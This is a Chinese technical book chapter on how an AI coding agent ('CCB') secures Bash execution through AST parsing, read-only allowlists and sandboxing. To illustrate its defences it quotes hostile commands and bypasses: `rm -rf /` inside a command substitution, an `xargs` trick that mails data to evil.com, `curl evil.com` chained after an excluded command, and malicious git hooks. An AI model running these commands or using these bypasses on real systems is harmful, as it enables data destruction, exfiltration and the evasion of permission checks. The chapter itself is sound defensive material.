# 第 9 章　Bash 安全门：AST 解析、只读判定与沙箱

> 第 8 章的权限系统把「要不要让 Bash 跑」交给了工具自己判断。可一条 bash 命令字符串里藏着的复杂度，远超「`Bash(git push:*)` 匹不匹配」这么简单——`echo $(rm -rf /)` 看起来人畜无害，`a=1; eval "$a"` 能执行任意代码。这一章我们钻进 CCB 在 shell 这个最危险入口建起的多层安全门：先用 tree-sitter 把命令解析成 AST 做 fail-closed 的可信性判定，再用 allowlist 判只读，最后用沙箱兜底。

## 9.1 一个根本问题：能不能为这条命令产出可信的 argv？

权限系统要拿 `Bash(git push:*)` 这种规则去匹配一条命令，前提是它得先知道这条命令的 `argv[]` 到底是什么——`argv[0]` 是 `git`、`argv[1]` 是 `push` 吗？但 shell 语法的表达力让这件事出奇地难：`g""it push`、`$(echo git) push`、`git $FLAG`，肉眼看都是「git push」，可它们的真实语义天差地别。

CCB 的核心安全模块 `src/utils/bash/ast.ts` 把自己的职责限定得极其克制。文件头注释写得斩钉截铁：

```
This is NOT a sandbox. It does not prevent dangerous commands from running.
It answers exactly one question: "Can we produce a trustworthy argv[] for
each simple command in this string?" If yes, downstream code can match
argv[0] against permission rules and flag allowlists. If no, ask the user.
```

**它只回答一个问题：能不能为这条命令里的每个简单命令产出一份可信的 `argv[]`。** 能，就把 `argv[0]` 交给权限规则去匹配；不能，就老老实实问用户。它不负责「拦截危险命令」——那是沙箱和权限系统的事。这种「单一职责 + 把判断结果交给上层」的设计，正是它能做到 fail-closed 的前提。

## 9.2 用 AST 取代手搓字符解析

注释解释了它替换掉了什么：旧方案是 `bashSecurity.ts` / `commands.ts` 里的 **shell-quote + 手搓字符遍历器**，靠一个个地检测「解析差异（parser differential）」来防御。所谓 parser differential，是指 shell-quote（一个 JS 库）和真正的 bash 对同一字符串的分词结果不同——攻击者就钻这个差。`bashSecurity.ts` 里至今留着大量这类补丁的痕迹，比如对回车符 `\r` 的处理注释：「shell-quote's `\s` INCLUDES \r, so shell-quote treats CR as a token boundary」——shell-quote 把 `TZ=UTC\recho` 分词成两段，而 bash 不会，这个差就能绕过检查。

新方案不再逐个堵差异，而是换了范式：用 **tree-sitter-bash** 把命令解析成 AST，然后用一份**显式的节点类型 allowlist** 去遍历这棵树。注释点明了关键设计属性：

```
The key design property is FAIL-CLOSED: we never interpret structure we
don't understand. If tree-sitter produces a node we haven't explicitly
allowlisted, we refuse to extract argv and the caller must ask the user.
```

**凡是 allowlist 里没有的节点类型，整条命令直接被判为 `too-complex`，走正常的权限弹窗流程。** 我们绝不去解释自己看不懂的结构。这把「检测已知的坏」反转成了「只信任已知的好」——这是安全工程里最重要的范式转换，也是第 1 章七面透镜里 fail-closed 那一面在 shell 层最彻底的体现。

`parseForSecurity` 的返回类型是个三态判别联合，把这个设计钉死在类型里：

```ts
| { kind: 'simple'; commands: SimpleCommand[] }      // 成功产出可信 argv
| { kind: 'too-complex'; reason: string; nodeType?: string }  // 看不懂，问用户
| { kind: 'parse-unavailable' }                       // 解析器没加载
```

## 9.3 DANGEROUS_TYPES：黑名单只是文档，allowlist 才是真防线

文件里有一个 `DANGEROUS_TYPES` 集合，列了 18 种「这条命令无法被静态分析」的节点类型：

```ts
const DANGEROUS_TYPES = new Set([
  'command_substitution', 'process_substitution', 'expansion',
  'simple_expansion', 'brace_expression', 'subshell',
  'compound_statement', 'for_statement', 'while_statement',
  'until_statement', 'if_statement', 'case_statement',
  'function_definition', 'test_command', 'ansi_c_string',
  'translated_string', 'herestring_redirect', 'heredoc_redirect',
])
```

这些类型要么**执行任意代码**（命令替换 `$(...)`、进程替换 `<(...)`、子 shell、各种控制流），要么**展开成静态无法确定的值**（参数展开 `$VAR`、算术展开、花括号展开 `{a,b}`）。但最值得玩味的是这段注释：

```
This set is not exhaustive — it documents KNOWN dangerous types. The real
safety property is the allowlist in walkArgument/walkCommand: any type NOT
explicitly handled there also triggers too-complex.
```

**`DANGEROUS_TYPES` 不是安全防线，它只是文档。** 真正的安全属性在 `walkArgument` / `walkCommand` 里的 allowlist——任何没被显式处理的节点类型，同样会触发 `too-complex`。换句话说，就算明天 tree-sitter 升级冒出一个全新的、危险的节点类型，没人记得往 `DANGEROUS_TYPES` 里加它，CCB 也不会漏判——因为它根本不在 allowlist 里，默认就是不可信。黑名单会遗漏，allowlist 不会。`DANGEROUS_TYPES` 存在的意义只是给分析埋点用（`DANGEROUS_TYPE_IDS` 把它们映射成数字 ID，因为 `logEvent` 不收字符串）。

`walkArgument` 的 allowlist 写得很细。比如它处理 `number` 节点时有一段 `SECURITY` 注释：tree-sitter 把 `10#$(cmd)`（算术进制语法）解析成一个 `number` 节点，把 `$(cmd)` 当成它的**子节点**——如果直接取 `number` 节点的 `.text`，就把命令替换偷渡过了权限检查。所以代码检查 `if (node.children.length > 0)` 就判 `too-complex`：纯数字（`10`、`16#ff`）没有子节点，带子节点的「数字」一定藏着展开。这种对 AST 细节的偏执，正是手搓字符解析永远做不到的。

## 9.4 解析器不可用与解析中止：两道 fail-closed 闸

`parseForSecurity`（第 382 行）先处理两个边界。第一，解析器可能压根没加载——tree-sitter 是 WASM 模块，`parseCommandRaw` 返回 `null` 表示模块未加载，这时 `parseForSecurity` 返回 `{ kind: 'parse-unavailable' }`，调用方据此保守回退。第二，空命令直接返回 `{ kind: 'simple', commands: [] }`。

更关键的是 `parseForSecurityFromAst`（第 401 行）。它在真正遍历 AST **之前**先跑一串预检（pre-check），每一条命中都直接判 `too-complex`：控制字符、Unicode 空白、反斜杠+空白、zsh 的 `~[` 语法、zsh 的 `=cmd` 展开、带引号的花括号……这些都是已知会引发解析差异的危险输入，在 AST 遍历前就拦掉。

然后是最硬的一道闸——`PARSE_ABORTED`。`parser.ts` 里 `parseCommandRaw` 的返回值有三种：`Node`（解析成功）、`null`（模块没加载）、`PARSE_ABORTED`（模块加载了但解析失败，比如超时、节点预算耗尽、Rust panic）。`PARSE_ABORTED` 是个专门的 Symbol，注释强调它「Distinct from `null`」。当 `parseForSecurityFromAst` 收到 `PARSE_ABORTED` 时：

```ts
if (root === PARSE_ABORTED) {
  // ... `enable`, `hash` leaked with Bash(*). Fail closed: too-complex → ask.
  return {
    kind: 'too-complex',
    reason: 'Parser aborted...',
    nodeType: 'PARSE_ABORT',
  }
}
```

解析器自己崩了、超时了、或者命令复杂到撑爆节点预算——这些情况下 CCB 不赌「大概没事」，而是一律 `too-complex` → 问用户。注释里提到的攻击场景是：如果不这么做，`enable`、`hash` 这类内建命令可能借 `Bash(*)` 这种宽规则泄漏出去。**解析器的失败本身被当作一个安全信号**，而不是一个可以忽略的小故障。这又是 fail-closed：能力不可用（连解析都做不到）时退回最保守的行为。

## 9.5 只读判定：allowlist 优先于正则

第 7 章说过，Bash 的 `isReadOnly(input)` 由 `checkReadOnlyConstraints` 动态算出，它决定了一条命令能不能并发、能不能享受更宽松的权限。这个函数在 `packages/builtin-tools/src/tools/BashTool/readOnlyValidation.ts`（第 1876 行），它的判定层层设防：

1. **不可解析直接 passthrough**：`tryParseShellCommand` 失败就交给后续权限检查。
2. **过旧的安全检查**：`bashCommandIsSafe_DEPRECATED` 不通过就 passthrough。
3. **UNC 路径**：含 Windows UNC 路径（可能被 WebDAV 攻击利用）→ 直接 `ask`。
4. **一连串 git 沙箱逃逸防御**（全部 passthrough，即拒绝自动放行）：
   - `cd && git`：复合命令里既有 `cd` 又有 git——防止 `cd /malicious/dir && git status` 触发恶意 git hook。
   - 当前目录像个被改造过的裸 git 仓库（`isCurrentDirectoryBareGitRepo`）——攻击者删掉 `.git/HEAD`、塞进 `hooks/pre-commit`，git 就会把 cwd 当 git 目录执行恶意 hook。
   - 复合命令写入 git 内部路径（`HEAD`、`objects/`、`refs/`、`hooks/`）后又跑 git。
   - 沙箱开启且 cwd 不是原始 cwd 时的 git 命令——防一个竞态：沙箱命令在子目录里造出裸仓库文件，后台 git（`sleep 10 && git status`）会在文件出现前通过裸仓库检查。
5. **所有子命令都只读才放行**：`splitCommand_DEPRECATED(command).every(...)` 逐个子命令验证。

判只读本身又有两条路径，注释明确表态了优先级。主路径是 `isCommandSafeViaFlagParsing`（第 1246 行），它用声明式的 `COMMAND_ALLOWLIST`——为每个命令显式列出「哪些 flag 是安全的」。比如 `xargs` 的配置里有一大段 `SECURITY` 注释解释为什么 `-i` 和 `-e`（小写）被移除：它们用 GNU getopt 的「可选附加参数」语义，`xargs -it tail a@evil.com` 在校验器眼里是安全的，在真实 xargs 里却会把 `tail` 当成目标命令拼成 `/usr/sbin/sendmail` 造成网络外泄。

而旧路径 `READONLY_COMMAND_REGEXES`（第 1509 行）是一组手写正则，注释明确警告：「If possible, avoid adding new regexes here and prefer using COMMAND_ALLOWLIST instead. This allowlist-based approach to CLI flags is more secure」。git 的只读命令早已从正则迁移到 `COMMAND_ALLOWLIST` 做严格的 flag 校验。这又是同一条原则：**显式 allowlist 比正则黑名单更安全**，因为正则总能被绕过。

## 9.6 shouldUseSandbox：兜底的隔离层

AST 判可信、allowlist 判只读，都是「要不要问用户」的判断。但还有一道物理隔离的兜底——沙箱。CCB 通过 `src/utils/sandbox/sandbox-adapter.ts` 把外部包 `@anthropic-ai/sandbox-runtime` 包成 CLI 专用的适配层（这是第 8 章「边界不信任外部输入」与依赖倒置的又一例：外部沙箱能力被收进一个适配器，宿主只跟适配器打交道）。

`shouldUseSandbox`（`BashTool/shouldUseSandbox.ts` 第 130 行）决定一条命令该不该进沙箱：

```ts
export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
  if (!SandboxManager.isSandboxingEnabled()) return false
  if (input.dangerouslyDisableSandbox &&
      SandboxManager.areUnsandboxedCommandsAllowed()) return false
  if (!input.command) return false
  if (containsExcludedCommand(input.command)) return false
  return true
}
```

逐条读：沙箱没启用→不沙箱；显式要求禁用沙箱**且策略允许**无沙箱命令→不沙箱（注意这个 AND——光有 `dangerouslyDisableSandbox` 还不够，组织策略 `areUnsandboxedCommandsAllowed` 也得放行，又是「约束只能收紧」）；没命令→不沙箱；命中用户配置的排除命令→不沙箱（这些通常是需要网络/写权限的构建命令如 `bazel`）。其余情况一律进沙箱。

`isSandboxingEnabled`（sandbox-adapter.ts 第 532 行）自己也是层层 fail-closed：平台不支持（只支持 macOS/Linux/WSL2）→ false；依赖检查有错 → false；不在 `enabledPlatforms` 白名单 → false；最后才看用户的 `sandbox.enabled` 设置。注释还提到一个 footgun 修复（#34044）：早期 `isSandboxingEnabled` 在依赖缺失时**静默**返回 false，用户配了 `allowedDomains` 以为有防护其实没有——所以现在专门有函数在启动时把「你开了沙箱但它跑不起来」的原因显式报给用户。**安全设置失效不能静默，必须报错**，这是「错误即文档」原则在安全配置上的应用。

`containsExcludedCommand` 里还藏着防绕过的细节：它把复合命令拆成子命令逐个检查（防止 `docker ps && curl evil.com` 因为第一段匹配排除规则就整条逃出沙箱），还会迭代地剥掉环境变量前缀和 wrapper（`timeout 30 bazel ...`、`FOO=bar bazel ...`）做定点（fixed-point）匹配。

## 9.7 三道门如何协同

把这三层串起来看，CCB 在 Bash 入口的防御是纵深的：

- **AST 可信性门**（`parseForSecurity`）：能不能产出可信 argv？不能 → `too-complex` → 问用户。这是「能不能信任权限匹配」的前提。
- **只读门**（`checkReadOnlyConstraints`）：这条命令只读吗？是 → 可并发、权限更宽；否 → passthrough 交给通用权限。
- **沙箱门**（`shouldUseSandbox`）：该不该物理隔离地跑？是 → 进沙箱，于是第 8 章那个 `canSandboxAutoAllow` 例外才成立——沙箱化的命令可以跳过 ask。

三道门各管一个问题，且全部 fail-closed：解析失败当不可信、判不准只读当会写、平台/依赖不全当没沙箱。任何一处「拿不准」，结果都偏向更安全的一侧。这正是把一个本质危险的能力（执行任意 shell）安全地交给一个会自主行动的 Agent 的工程答案。

下一章，我们看一个相反方向的设计——当 CCB 想**减少**打扰、把放行权交给一个分类器模型时，它如何在「自动化」和「安全」之间找平衡：Auto 模式与 YOLO 分类器。

## 本章小结

- `src/utils/bash/ast.ts` 只回答一个问题：「能否为命令里每个简单命令产出可信的 `argv[]`」——能则交权限规则匹配，不能则 `too-complex` 问用户；它**不是沙箱**，不负责拦截危险命令。
- 新方案用 **tree-sitter-bash 解析成 AST + 显式节点 allowlist** 取代旧的 shell-quote + 手搓字符遍历（后者靠逐个堵 parser differential，如 `\r` 分词差异）。
- 核心属性 FAIL-CLOSED：allowlist 里没有的节点类型一律 `too-complex`，「绝不解释看不懂的结构」。
- `DANGEROUS_TYPES`（18 种：command_substitution/expansion/subshell/控制流等）**只是文档与埋点**；真正防线是 `walkArgument`/`walkCommand` 的 allowlist——任何未显式处理的类型也触发 `too-complex`，黑名单会漏、allowlist 不会。
- `parseForSecurity` 三态：`simple`（成功）/`too-complex`（看不懂）/`parse-unavailable`（解析器没加载）；`PARSE_ABORTED`（超时/节点预算/panic）也被当作安全信号判 `too-complex`。
- `number` 节点带子节点（`10#$(cmd)` 算术进制语法藏命令替换）等细节被精确拦截——AST 级偏执是手搓解析做不到的。
- `checkReadOnlyConstraints` 层层设防：不可解析→passthrough、UNC 路径→ask、多种 git 沙箱逃逸防御（`cd&&git`、裸仓库、写 git 内部路径、cwd 偏移竞态）、所有子命令只读才 `allow`。
- 只读判定优先用声明式 `COMMAND_ALLOWLIST`（显式 flag 校验，如 `xargs` 移除 `-i`/`-e`），旧的 `READONLY_COMMAND_REGEXES` 正则被明确建议弃用——allowlist 比黑名单正则更安全。
- `shouldUseSandbox`：沙箱启用 + 非（显式禁用 AND 策略允许）+ 有命令 + 不在排除列表 → 进沙箱；`isSandboxingEnabled` 层层 fail-closed（平台/依赖/enabledPlatforms/设置），且安全设置失效不静默而报错。
- `containsExcludedCommand` 拆分复合命令、迭代剥离 env 前缀与 wrapper 做定点匹配防绕过；沙箱化命令成立后才有第 8 章 `canSandboxAutoAllow` 跳过 ask 的例外。

## 动手实验

1. **实验一：验证 allowlist 思维** — 打开 `src/utils/bash/ast.ts`，读 `DANGEROUS_TYPES` 注释和 `walkArgument`。论证：假设 tree-sitter 新增一个名为 `foo_expansion` 的危险节点类型，但没人把它加进 `DANGEROUS_TYPES`，CCB 会漏判吗？从 allowlist 的角度解释为什么不会。
2. **实验二：追一条命令的三态结局** — 给定三条命令 `ls -la`、`echo $(whoami)`、`a=1`，分别推演 `parseForSecurity` 会返回 `simple` / `too-complex` / 还是别的。结合 `DANGEROUS_TYPES` 说明 `$(whoami)` 对应哪个节点类型、为什么必然 `too-complex`。
3. **实验三：拆解 git 沙箱逃逸防御** — 在 `readOnlyValidation.ts` 的 `checkReadOnlyConstraints` 里找到 4 处 git 相关的 `passthrough` 分支。为每一处用一句话写出它防的是哪种攻击（hook 注入 / 裸仓库 / 写 git 内部路径 / cwd 竞态），并说明为什么是 passthrough 而非直接 deny。
4. **实验四：推演沙箱决策** — 读 `shouldUseSandbox` 和 `areUnsandboxedCommandsAllowed`（默认 `?? true`）。假设用户在命令里传了 `dangerouslyDisableSandbox: true`，但组织策略把 `allowUnsandboxedCommands` 设成了 `false`，这条命令会进沙箱吗？从「约束只能收紧」的角度解释这个 AND 判断的意义。

> **下一章预告**：本章讲的是「在动手前判断危不危险」。第 10 章我们看 CCB 如何用一个**分类器模型**把放行权自动化——`auto` 模式、YOLO 分类器、`toAutoClassifierInput` 把工具输入喂给分类器，以及当分类器不可用时如何 fail-closed 回落到弹窗询问，看「让 AI 替你点同意」这件事怎么在安全约束下落地。
